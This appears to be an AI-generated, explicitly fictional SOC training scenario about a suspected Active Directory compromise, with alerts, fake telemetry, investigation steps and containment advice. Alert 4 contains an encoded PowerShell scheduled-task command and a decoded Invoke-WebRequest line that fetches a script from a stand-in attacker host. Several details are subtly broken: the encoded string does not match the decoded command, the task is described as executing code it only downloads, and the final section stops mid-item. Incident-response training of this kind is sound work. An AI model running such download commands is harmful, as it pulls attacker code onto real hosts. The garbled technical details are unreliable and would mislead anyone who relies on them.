---
Owner: Chris Adams
title: Suspected Active Directory Compromise
type: Simulated Scenario
topic: active-directory
summary: SOC is receiving series of alerts of suspicious activity in the Active Directory environment.
date: 2024-11-13
tags:
  - ai-generated
  - ai-generated/cyber-scenarios
  - security-engineer/active-directory
publish: 
goal: Investigate the suspicious logins to high-privilege accounts.
---
> [!Important] Important!
> This is a fake scenario generated by AI and is meant solely for educational purposes. 
### **Scenario: Suspected Active Directory Compromise**

#### **Background:**
It’s Friday afternoon, and your SIEM starts firing a series of alerts indicating suspicious activity within the Active Directory (AD) environment. Initial analysis points to unauthorized privilege escalation and potential lateral movement involving sensitive accounts. The alerts originate from a standard user account, `MarketingUser01`, which typically has no administrative privileges.

The activity suggests that `MarketingUser01` was used to elevate privileges and initiate suspicious login attempts across several high-privilege AD accounts. Your job is to investigate the extent of the compromise, determine whether it involves domain persistence, and recommend containment measures.

<div class="neon-line"></div>

#### **Alert Summary:**

1. **Unusual Privilege Escalation Detected**  
   Type: AD Privilege Escalation Alert  
   Source: `MarketingUser01` on `WORKSTATION-07`  
   Description: Account `MarketingUser01`, a low-privilege user, was added to the Domain Admins group and later removed. The activity originated from `WORKSTATION-07`.

2. **Suspicious Kerberos Ticket Request (Golden Ticket Indicator)**  
   Type: AD Authentication Alert  
   Source: `DC-01` (Primary Domain Controller)  
   Description: `krbtgt` service account shows abnormal Kerberos ticket-granting ticket (TGT) request activity, possibly indicating a "Golden Ticket" attack.

3. **Unusual Login Attempts Using High-Privilege Accounts**  
   Type: AD Authentication Alert  
   Source: `WORKSTATION-07`, `WORKSTATION-12`  
   Description: Several high-privilege accounts (e.g., `Admin01`, `SQLAdmin`, `BackupAdmin`) show failed login attempts originating from user endpoints, suggesting potential lateral movement.

4. **Creation of a Suspicious Scheduled Task on Domain Controller (DC-02)**  
   Type: Endpoint Monitoring Alert  
   Source: `DC-02`  
   Description: A scheduled task named “UpdatePolicy” was created on `DC-02`, set to execute a PowerShell script under a domain admin account. This task appears to be malicious.

<div class="neon-line"></div>

### **Objective:**
Identify how the attacker gained access to AD, assess the scope of the compromise, and recommend containment actions to limit further damage. Look for indicators of domain persistence (e.g., unauthorized accounts, scheduled tasks, or Golden Ticket usage) and suggest recovery measures.

<div class="neon-line"></div>

### **Fake Telemetry Details and Logs**

#### **Alert 1: Unusual Privilege Escalation Detected**

**Telemetry Data (User Group Modifications):**
- **User Account**: `MarketingUser01`
- **Source Host**: `WORKSTATION-07`
- **Event Timeline**:
  - **10:15 AM** - `MarketingUser01` was added to `Domain Admins` group.
  - **10:17 AM** - `MarketingUser01` initiated a remote connection to `DC-01`.
  - **10:19 AM** - `MarketingUser01` was removed from `Domain Admins` group.

**Analysis:**  
A temporary privilege escalation appears to have occurred, likely for initial reconnaissance or domain manipulation. The addition and subsequent removal from the Domain Admins group may indicate an attempt to limit detection by quickly covering tracks.

<div class="neon-line"></div>

#### **Alert 2: Suspicious Kerberos Ticket Request (Golden Ticket Indicator)**

**Telemetry Data (Kerberos Authentication):**
- **Domain Controller**: `DC-01`
- **Account**: `krbtgt`
- **Event Details**:
  - **10:20 AM** - Anomalous Kerberos TGT issued for `krbtgt` account with an unusually long validity period.
  - **Ticket Hash**: `0d5af53bca987d1e3b09a6d59b890e1b` (matching known Golden Ticket patterns)
  - **Source Host**: `WORKSTATION-07`

**Analysis:**  
The request for an unusually long-lived Kerberos ticket indicates potential abuse of AD's Kerberos authentication via a "Golden Ticket" attack, granting indefinite access across the domain without needing standard credentials.

<div class="neon-line"></div>

#### **Alert 3: Unusual Login Attempts Using High-Privilege Accounts**

**Telemetry Data (Failed Logins and Lateral Movement):**
- **Source Hosts**: `WORKSTATION-07`, `WORKSTATION-12`
- **Target Accounts**: `Admin01`, `SQLAdmin`, `BackupAdmin`
- **Event Timeline**:
  - **10:30 AM** - Login failures for `Admin01` from `WORKSTATION-07`
  - **10:32 AM** - Login failures for `SQLAdmin` from `WORKSTATION-12`
  - **10:35 AM** - Failed logins for `BackupAdmin` from `WORKSTATION-07`

**Analysis:**  
These failed login attempts indicate attempted lateral movement. The compromised account may be attempting to access sensitive AD or network resources using elevated account names, suggesting the attacker is exploring potential escalation paths.

<div class="neon-line"></div>

#### **Alert 4: Creation of a Suspicious Scheduled Task on Domain Controller (DC-02)**

**Telemetry Data (Scheduled Task Creation):**
- **Domain Controller**: `DC-02`
- **Scheduled Task Name**: `UpdatePolicy`
- **Command**:
  ```shell
  powershell.exe -enc JABxPSdodHRwOi8vbWFsaWNpb3VzLXVwZGF0ZXJzZXJ2ZXIuY29tL3BheWxvYWQvZG93bmxvYWQucHN1JztpRXhlY3VSZXF1ZXN0IC11cmkgJABxIC1PdXRGaWxlICcDgYB3VG1wJzAycHNyJw==
  ```
  - **Decoded Command**: 
    ```shell
    Invoke-WebRequest -Uri http://malicious-updater.com/payload/download.ps1 -OutFile C:\Temp\malicious.ps1
    ```
- **Execution Time**: Set to trigger every 12 hours

**Analysis:**  
The task `UpdatePolicy` appears to download and execute a remote PowerShell script, suggesting a persistence mechanism. It’s likely an attempt to ensure continuous access, even after initial compromise measures are discovered and mitigated.

<div class="neon-line"></div>

### **Investigation Steps**

This is a structured investigation flow to fully analyze the incident and recommend actions.

#### **Step 1: Identify Privilege Escalation and Group Modification Events**

- **Review Account Activity for `MarketingUser01`:**
  - Investigate how `MarketingUser01` obtained access to add itself to `Domain Admins`.
  - Check if `MarketingUser01` had any recently modified permissions or if its credentials were compromised (e.g., via phishing).
  
- **Audit AD Group Membership Changes:**
  - Review logs to confirm when and by whom `MarketingUser01` was added and removed from `Domain Admins`.
  - Investigate any patterns or repeated group modifications involving other non-admin users.

#### **Step 2: Analyze Suspicious Kerberos TGT Request (Golden Ticket)**

- **Identify Ticket Creation Details:**
  - Review Kerberos logs on `DC-01` to verify when the TGT was issued and which service ticket hash was used.
  - Confirm if the `krbtgt` account has been recently accessed or compromised.

- **Golden Ticket Confirmation:**
  - Validate if the ticket requests match known Golden Ticket attack characteristics (e.g., long validity period, unusual source hosts).
  - If a Golden Ticket attack is confirmed, immediate remediation on the `krbtgt` account is necessary to avoid further unauthorized access.

#### **Step 3: Track Failed Login Attempts Across Workstations**

- **Identify Lateral Movement Indicators:**
  - Correlate login failures with typical AD reconnaissance patterns, such as attempts to access sensitive accounts across multiple endpoints.
  - Check if other workstations show similar login failures, indicating broader lateral movement.

- **Isolate Affected Endpoints:**
  - Based on the scope, quarantine `WORKSTATION-07` and `WORKSTATION-12` to prevent further lateral movement.

#### **Step 4: Investigate the Suspicious Scheduled Task on DC-02**

- **Analyze Task Commands:**
  - Decode and analyze the scheduled task payload (`malicious.ps1`) to determine its function and risk level.
  - Check if similar scheduled tasks were created across other domain controllers, as this could indicate a widespread persistence tactic.

- **Disable and Delete Task:**
  - Disable and delete the task `UpdatePolicy` from `DC-02` and confirm it’s not re-created by monitoring task creation events.

<div class="neon-line"></div>

### **Containment and Remediation Actions**

1. **Immediate Actions:**
   - **Isolate Affected Workstations** (`WORKSTATION-07` and `WORKSTATION-12`) to prevent further unauthorized access and lateral movement.
   - **Change the Password for `krbtgt` Account**: This will invalidate any existing Golden Tickets and prevent further abuse.
   - **Disable `MarketingUser01` Account**: Since it’s compromised, disable it to prevent additional misuse.

2. **Remediation:**
   - Review AD logs for any other unauthorized privilege escalations.
   - Conduct a password reset for all accounts that experienced failed login attempts (e.g., `Admin01`, `SQLAdmin`, `BackupAdmin`) to ensure they’re secure.

3. **Implement Long-Term Security Improvements:**
   - **Increase Monitoring**:****

<div class="neon-line"></div>

#### Created on: Nov 12, 2024
---
<div style="text-align: center;">
	<div class="gradient-text">👾 2024 rabb1th0les (Chris A)dams 👾</div> 
	🌴☀Thanks for supporting my page ☀🌴
	<nav>
		<ul style="list-style: none; padding: 0;">
			<div style="text-align: center;">
				<li><a href="index.html">Home</a> | <a href="Contact.html">Contact</a></li>
			</div>
		</ul>
	</nav>	
</div>